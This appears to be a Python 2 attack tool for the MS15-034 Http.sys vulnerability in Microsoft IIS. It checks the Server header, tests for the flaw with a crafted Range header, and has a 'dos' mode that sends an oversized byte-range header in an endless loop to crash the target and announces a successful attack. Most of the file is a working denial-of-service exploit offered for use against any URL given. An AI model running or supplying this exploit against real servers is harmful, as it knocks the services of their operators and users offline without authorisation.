# -*- coding: utf-8 -*-   #https://github.com/JYanger/
import requests
import sys
import time
from requests.packages import urllib3
import ctypes
urllib3.disable_warnings()  # https不进行验证
STD_INPUT_HANDLE = -10
STD_OUTPUT_HANDLE= -11
STD_ERROR_HANDLE = -12
FOREGROUND_BLACK = 0x0
FOREGROUND_BLUE = 0x01 # text color contains blue.   01蓝色
FOREGROUND_WRITE = 0x07 # text color contains blue.  07亮白色
FOREGROUND_GREEN= 0x02 # text color contains green. 02 绿色
FOREGROUND_RED = 0x04 # text color contains red.     04红色
FOREGROUND_YELLOW= 0x06 # text color contains yellow. 06黄色
FOREGROUND_INTENSITY = 0x08 # text color is intensified. 字体颜色加强
class Color:
    std_out_handle = ctypes.windll.kernel32.GetStdHandle(STD_OUTPUT_HANDLE)
    def set_cmd_color(self, color, handle=std_out_handle):
        bool = ctypes.windll.kernel32.SetConsoleTextAttribute(handle, color)
        return bool
    def reset_color(self):
        self.set_cmd_color(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_WRITE)
    def print_red_text(self, print_text):
        self.set_cmd_color(FOREGROUND_RED | FOREGROUND_INTENSITY)
        print print_text
        self.reset_color()
    def print_green_text(self, print_text):
        self.set_cmd_color(FOREGROUND_GREEN | FOREGROUND_INTENSITY)
        print print_text
        self.reset_color()
    def print_write_text(self, print_text):
        self.set_cmd_color(FOREGROUND_WRITE | FOREGROUND_INTENSITY)
        print print_text
        self.reset_color()
    def print_blue_text(self, print_text):
        self.set_cmd_color(FOREGROUND_BLUE | FOREGROUND_INTENSITY)
        print print_text
        self.reset_color()
    def print_yellow_text(self, print_text):
        self.set_cmd_color(FOREGROUND_YELLOW | FOREGROUND_INTENSITY)
        print print_text
        self.reset_color()

def identify_iis(domain,num):
    col = Color()
    try:
        req = requests.get(str(domain), verify=False)
        remote_server = req.headers['server']
        if 'Microsoft-IIS' in remote_server:
            print('Server: ' + remote_server)
            if str(num)=='check':
                ms15_034_test(str(domain))
            elif str(num)=='dos':
                ms15_034_dos(str(domain))
            else:
                usage()
        else:
            remote_server = 'Server Maybe is: '+ remote_server
            col.print_green_text('Sorry, Server isn\'t IIS')
            col.print_green_text(remote_server)
    except Exception as e:
        print e
 
def ms15_034_test(domain):
    col = Color()
    try:
        headers = {'Host': 'stuff','Range': 'bytes=0-18446744073709551615'}
        req = requests.get(str(domain), headers = headers, verify=False)
        if 'Requested Range Not Satisfiable' in req.content:
            col.print_red_text('WARNING: SERVER IS VULNERABLE (MS15-034)!')
        elif 'The request has an invalid header name' in req.content:
            col.print_green_text('Server\'s Bug has been repaired')
            col.print_green_text('Server is not vulnerable(MS15-034)')
        else:
            col.print_yellow_text('IIS service can\'t show whether a vulnerability exists. Please input urlpath like this to testing.')
            col.print_yellow_text('e.g: [*check] python2 Http.sys.py http(s)://www.xxx.com/xxx/xxx.js check')
            
    except Exception as e:
        print e

def ms15_034_dos(domain):
    col = Color()
    #print 'wait for kaifa'
    default_path = ['/iisstart.htm','/welcome.png']
    headers = {'Host': 'stuff','Range': 'bytes=18-18446744073709551615'}
    if domain.count('/') <= 3:
        try:
            for i in default_path:
                domain1 = domain + i
                req = requests.get(str(domain1), verify=False)
                if req.status_code==200:
                    col.print_blue_text('Find path: '+domain1)
                    time.sleep(1)
                    col.print_blue_text('Sending BSOD POC, please wait for a while.....')
                    time.sleep(1)
                    while (1):
                        try:
                            req1 = requests.get(str(domain1),headers =headers, verify=False, timeout=5)
                        except Exception as e:
                            col.print_red_text('Attack the server successful!')
                            exit()
            col.print_blue_text('Can\'t findout a default path, Please input urlpath like this.')
            col.print_blue_text('[*exploit] python2 Http.sys.py http(s)://www.xxx.com/xxx/xxx.js dos')  
        except Exception as e:
            #print e
            pass

    else:
        col.print_blue_text('Find path: '+domain)
        col.print_blue_text('Sending BSOD POC, please wait for a while.....')
        while (1):
            try:
                req1 = requests.get(str(domain),headers =headers, verify=False, timeout=5)
            except Exception as e:
                col.print_red_text('Attack the server successful!')
                exit()

def usage():
    col = Color()
    col.print_write_text('This is a MS15-034 tool')
    col.print_write_text('e.g: [*check] python2 Http.sys.py http(s)://www.xxx.com check')
    col.print_write_text('e.g: [*exploit] python2 Http.sys.py http(s)://www.xxx.com dos')
    col.print_write_text('e.g: [*check] python2 Http.sys.py http(s)://www.xxx.com/xxx/xxx.js check')
    col.print_write_text('e.g: [*exploit] python2 Http.sys.py http(s)://www.xxx.com/xxx/xxx.js dos')
    
if __name__== '__main__':
    if len(sys.argv) != 3:
        usage()
    else:
        identify_iis(sys.argv[1],sys.argv[2])

      

    
